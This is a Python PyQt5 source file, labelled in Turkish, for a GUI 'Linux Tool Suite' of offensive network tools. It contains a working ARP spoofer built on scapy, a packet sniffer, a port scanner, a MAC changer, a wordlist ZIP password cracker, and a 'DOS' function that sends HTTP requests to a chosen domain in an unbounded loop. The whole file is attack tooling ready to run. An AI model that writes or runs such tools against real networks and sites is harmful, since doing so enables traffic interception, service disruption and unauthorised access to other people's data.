import sys
import scapy.all as scapy
import socket
import whois
import subprocess
import threading
import zipfile
import pywifi
from pywifi import const
import requests
from PyQt5.QtWidgets import QApplication, QFileDialog ,QMainWindow, QPushButton, QVBoxLayout, QWidget, QLabel, QLineEdit, QTextEdit, QMessageBox

class MainMenu(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Linux Tool Suite")
        self.setGeometry(100, 100, 400, 300)

        # Ana menu duzeni
        layout = QVBoxLayout()

        self.label = QLabel("Lutfen bir arac secin:")
        layout.addWidget(self.label)

        # Her arac icin butonlar
        self.buttons = {
            "ARP Spoofer": self.open_arp_spoofer,
            "Port Scanner": self.open_port_scanner,
            "Packet Sniffer": self.open_packet_sniffer,
            "WiFi Scanner": self.open_wifi_scanner,
            "Whois/DOS Tool": self.open_whois_dos,
            "MAC Changer": self.open_mac_changer,
            "ZIP Password Cracker": self.open_zip_cracker
        }

        for name, method in self.buttons.items():
            button = QPushButton(name)
            button.clicked.connect(method)
            layout.addWidget(button)

        # Merkezi widget ayari
        central_widget = QWidget()
        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)

    # Arac pencerelerini acmak icin yer tutucu metotlar
    def open_arp_spoofer(self):
        self.tool_window1 = ArpSpooferWindow(1)
        self.tool_window1.show()

        self.tool_window2 = ArpSpooferWindow(2)
        self.tool_window2.show()

    def open_port_scanner(self):
        self.tool_window = PortScannerWindow()
        self.tool_window.show()

    def open_packet_sniffer(self):
        self.tool_window = PacketSnifferWindow()
        self.tool_window.show()

    def open_wifi_scanner(self):
        self.tool_window = WifiScannerWindow()
        self.tool_window.show()

    def open_whois_dos(self):
        self.tool_window = WhoisDosWindow()
        self.tool_window.show()

    def open_mac_changer(self):
        self.tool_window = MacChangerWindow()
        self.tool_window.show()
    def open_zip_cracker(self):
        self.tool_window = ZipPasswordCrackerWindow()
        self.tool_window.show()

# ARP Spoofer
class ArpSpooferWindow(QWidget):
    def __init__(self, instance_num):
        super().__init__()
        self.setWindowTitle(f"ARP Spoofer {instance_num}")
        self.setGeometry(150 + (instance_num - 1) * 420, 150, 400, 200)

        self.instance_num = instance_num
        layout = QVBoxLayout()

        self.target_ip_label = QLabel("Hedef IP:")
        self.target_ip_input = QLineEdit()
        layout.addWidget(self.target_ip_label)
        layout.addWidget(self.target_ip_input)

        self.spoof_ip_label = QLabel("Sahte IP:")
        self.spoof_ip_input = QLineEdit()
        layout.addWidget(self.spoof_ip_label)
        layout.addWidget(self.spoof_ip_input)

        self.start_button = QPushButton(f"{'Başlat 1' if self.instance_num == 1 else 'Başlat 2'}")
        self.start_button.clicked.connect(self.start_arp_spoofing)
        layout.addWidget(self.start_button)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

    def start_arp_spoofing(self):
        target_ip = self.target_ip_input.text()
        spoof_ip = self.spoof_ip_input.text()

        if not target_ip or not spoof_ip:
            QMessageBox.warning(self, "Hata", "Hedef IP ve Sahte IP alanlarini doldurun.")
            return

        try:
            arp_request = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip)
            scapy.send(arp_request, verbose=False)
            if self.instance_num == 1:
                self.output.append(f"Başlatıldı (Form 1): {target_ip} için {spoof_ip} olarak sahte ARP gönderiliyor...")
            else:
                self.output.append(f"Başlatıldı (Form 2): {target_ip} için {spoof_ip} olarak farklı bir sahte ARP gönderiliyor...")
        except Exception as e:
            self.output.append(f"Hata: {str(e)}")

# Port Scanner
class PortScannerWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Port Scanner")
        self.setGeometry(150, 150, 400, 300)

        layout = QVBoxLayout()

        self.ip_label = QLabel("Hedef IP Aralığı:")
        self.ip_input = QLineEdit()
        layout.addWidget(self.ip_label)
        layout.addWidget(self.ip_input)

        self.port_label = QLabel("Portlar (virgülle ayrılmış):")
        self.port_input = QLineEdit()
        layout.addWidget(self.port_label)
        layout.addWidget(self.port_input)

        self.start_button = QPushButton("Taramayı Başlat")
        self.start_button.clicked.connect(self.start_port_scanning)
        layout.addWidget(self.start_button)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

    def start_port_scanning(self):
        ip_range = self.ip_input.text()
        ports = self.port_input.text().split(',')

        if not ip_range or not ports:
            QMessageBox.warning(self, "Hata", "IP Aralığı ve Port bilgilerini doldurun.")
            return

        self.output.append(f"Taranıyor: {ip_range} için portlar {', '.join(ports)}...")

        for port in ports:
            port = int(port.strip())
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip_range, port))

                if result == 0:
                    self.output.append(f"Port {port} açık!")
                else:
                    self.output.append(f"Port {port} kapalı!")
                sock.close()
            except Exception as e:
                self.output.append(f"Hata: {str(e)}")

# Packet Sniffer
class PacketSnifferWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Packet Sniffer")
        self.setGeometry(150, 150, 400, 200)

        layout = QVBoxLayout()

        self.protocol_label = QLabel("Protokol Filtre (ör. icmp, tcp, udp):")
        self.protocol_input = QLineEdit()
        layout.addWidget(self.protocol_label)
        layout.addWidget(self.protocol_input)

        self.start_button = QPushButton("Dinlemeyi Başlat")
        self.start_button.clicked.connect(self.start_sniffing)
        layout.addWidget(self.start_button)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

    def start_sniffing(self):
        protocol = self.protocol_input.text()

        if not protocol:
            QMessageBox.warning(self, "Hata", "Protokol filtresini doldurun.")
            return

        self.output.append(f"Dinleniyor: {protocol} protokolü...")

        def packet_callback(packet):
            self.output.append(f"Packet: {packet.summary()}")

        scapy.sniff(filter=protocol, prn=packet_callback)

# WiFi Scanner
class WifiScannerWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WiFi Scanner")
        self.setGeometry(150, 150, 400, 300)

        layout = QVBoxLayout()

        self.scan_button = QPushButton("Ağları Tara")
        self.scan_button.clicked.connect(self.scan_wifi)
        layout.addWidget(self.scan_button)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

    def scan_wifi(self):
        self.output.append("WiFi ağları taranıyor...")

        try:
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.scan()
            scan_results = iface.scan_results()

            if not scan_results:
                self.output.append("Hiçbir WiFi ağı bulunamadı.")
            else:
                for network in scan_results:
                    self.output.append(f"Ağ: {network.ssid}, Sinyal Gücü: {network.signal}, Şifre: {'Var' if network.akm else 'Yok'}")
        except Exception as e:
            self.output.append(f"Hata: {str(e)}")

# Whois/DOS Tool
class WhoisDosWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Whois/DOS Tool")
        self.setGeometry(150, 150, 400, 300)

        layout = QVBoxLayout()

        self.domain_label = QLabel("Domain Adı:")
        self.domain_input = QLineEdit()
        layout.addWidget(self.domain_label)
        layout.addWidget(self.domain_input)

        self.whois_button = QPushButton("Whois Sorgusu Yap")
        self.whois_button.clicked.connect(self.perform_whois)
        layout.addWidget(self.whois_button)

        self.dos_button = QPushButton("DOS Simülasyonu Başlat")
        self.dos_button.clicked.connect(self.start_dos_attack)
        layout.addWidget(self.dos_button)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

    def perform_whois(self):
        domain = self.domain_input.text()

        if not domain:
            QMessageBox.warning(self, "Hata", "Domain adı boş olamaz.")
            return

        try:
            w = whois.whois(domain)
            self.output.append(f"Whois Sonuçları: {w}")
        except Exception as e:
            self.output.append(f"Hata: {str(e)}")

    def start_dos_attack(self):
        domain = self.domain_input.text()

        if not domain:
            QMessageBox.warning(self, "Hata", "Domain adı boş olamaz.")
            return

        self.output.append(f"DOS saldırısı başlatılıyor: {domain}...")
        
        self.dos_thread = threading.Thread(target=self.dos_attack, args=(domain,))
        self.dos_thread.start()

    def dos_attack(self, domain):
        while True:
            try:
                response = requests.get(f"http://{domain}", timeout=5)
                status_code = response.status_code
                self.output.append(f"Paket gönderildi: Durum Kodu: {status_code}")
            except requests.exceptions.RequestException as e:
                self.output.append(f"Hata: {str(e)}")

# MAC Changer
class MacChangerWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("MAC Changer")
        self.setGeometry(150, 150, 400, 300)

        layout = QVBoxLayout()

        self.interface_label = QLabel("Ağ Arayüzü:")
        self.interface_input = QLineEdit()
        layout.addWidget(self.interface_label)
        layout.addWidget(self.interface_input)

        self.mac_label = QLabel("Yeni MAC Adresi:")
        self.mac_input = QLineEdit()
        layout.addWidget(self.mac_label)
        layout.addWidget(self.mac_input)

        self.change_button = QPushButton("MAC Adresini Değiştir")
        self.change_button.clicked.connect(self.change_mac_address)
        layout.addWidget(self.change_button)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

    def change_mac_address(self):
        interface = self.interface_input.text()
        new_mac = self.mac_input.text()

        if not interface or not new_mac:
            QMessageBox.warning(self, "Hata", "Ağ arayüzü ve yeni MAC adresi boş olamaz.")
            return
        try:
            subprocess.call(['ifconfig', interface, 'down'])
            subprocess.call(['ifconfig', interface, 'hw', 'ether', new_mac])
            subprocess.call(['ifconfig', interface, 'up'])
            self.output.append(f"MAC adresi {interface} için değiştirildi: {new_mac}")
        except Exception as e:
            self.output.append(f"Hata: {str(e)}")

class ZipPasswordCrackerWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ZIP Password Cracker")
        self.setGeometry(150, 150, 500, 400)

        layout = QVBoxLayout()
        self.zip_label = QLabel("ZIP Dosyasını Seçin:")
        layout.addWidget(self.zip_label)

        self.zip_path_input = QLineEdit()
        layout.addWidget(self.zip_path_input)

        self.browse_zip_button = QPushButton("ZIP Seç")
        self.browse_zip_button.clicked.connect(self.browse_zip_file)
        layout.addWidget(self.browse_zip_button)

        self.wordlist_label = QLabel("Wordlist Dosyasını Seçin:")
        layout.addWidget(self.wordlist_label)

        self.wordlist_path_input = QLineEdit()
        layout.addWidget(self.wordlist_path_input)

        self.browse_wordlist_button = QPushButton("Wordlist Seç")
        self.browse_wordlist_button.clicked.connect(self.browse_wordlist_file)
        layout.addWidget(self.browse_wordlist_button)

        self.start_button = QPushButton("Şifre Kırmayı Başlat")
        self.start_button.clicked.connect(self.start_cracking)
        layout.addWidget(self.start_button)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

    def browse_zip_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "ZIP Dosyası Seç", "", "ZIP Files (*.zip)")
        if file_path:
            self.zip_path_input.setText(file_path)

    def browse_wordlist_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Wordlist Dosyası Seç", "", "Text Files (*.txt)")
        if file_path:
            self.wordlist_path_input.setText(file_path)

    def start_cracking(self):
        zip_file = self.zip_path_input.text()
        wordlist_file = self.wordlist_path_input.text()

        if not zip_file or not wordlist_file:
            QMessageBox.warning(self, "Hata", "ZIP dosyası ve Wordlist dosyasını seçin.")
            return

        try:
            passwords = self.load_passwords(wordlist_file)
            found_password = self.crack_zip(zip_file, passwords)
            if found_password:
                self.output.append(f"Şifre bulundu: {found_password}")
            else:
                self.output.append("Şifre bulunamadı.")
        except Exception as e:
            QMessageBox.critical(self, "Hata", f"Hata oluştu: {e}")

    def load_passwords(self, wordlist_file):
        with open(wordlist_file, "r", encoding="utf-8") as f:
            return [line.strip() for line in f]

    def crack_zip(self, zip_file, passwords):
        with zipfile.ZipFile(zip_file) as zf:
            for password in passwords:
                try:
                    zf.extractall(pwd=password.encode())
                    return password
                except RuntimeError:
                    continue
        return None

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_window = MainMenu()
    main_window.show()
    sys.exit(app.exec_())
